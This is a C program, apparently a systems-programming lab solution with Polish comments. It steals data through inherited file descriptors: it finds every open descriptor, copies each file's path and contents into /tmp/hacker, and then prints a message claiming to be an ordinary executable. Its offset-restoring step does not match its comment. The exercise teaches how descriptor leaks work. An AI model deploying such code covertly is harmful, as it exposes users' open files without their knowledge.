#include "csapp.h"

int main(void) {
    long max_fd = sysconf(_SC_OPEN_MAX);
    int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

    /* TODO: Something is missing here! */
    // Ustawiamy rozmiar bufora, w link bedziemy przechowywać plik
    // docelowy dowiązania symbolicznego, a w path jego ścieżkę.
    const int buf_size = 1024;
    char link[buf_size];
    char path[buf_size];

    // Przeszukujemy wszystkie dostępne deskryptory (max_fd wyżej)
    for (int i = 0; i < max_fd; i++) {
        // Przesuwamy offset w deskryptorze pliku o id i, jeśli to się
        // powiedzie to return value >=0 (ustawione przesunięcie
        // liczone w bajtach od początku pliku).
        if (lseek(i, 0, 0) >= 0) {
            // Do link przypisujemy ścieżkę deskryptora
            snprintf(link, buf_size, "/proc/self/fd/%d", i);

            // Plik docelowy czytamy przez readlink(2)
            int path_len;
            if ((path_len = Readlink(link, path, buf_size)) < 0) {
                fprintf(stderr, "Readlink failure!");
                exit(1);
            }
            
            // I do deskryptora out (plik /tmp/hacker) dopisujemy
            // numer deskryptora i oraz ścieżkę pliku.
            path[path_len] = '\0';
            dprintf(out, "File descriptor %d is '%s' file!\n", i, path);

            // Na koniec musimy "wrócić" do początkowego offsetu fd,
            // aby zmiany nie były nigdzie widoczne.
            int total_count = 0;
            int read_count;
            char buf[4096];

            while ((read_count = read(i, buf, 4096)) > 0) {
                Write(out, buf, read_count);
                total_count += read_count;
            }

            lseek(i, -total_count, 0);
        }
    }

    Close(out);

    printf("I'm just a normal executable you use on daily basis!\n");

    return 0;
}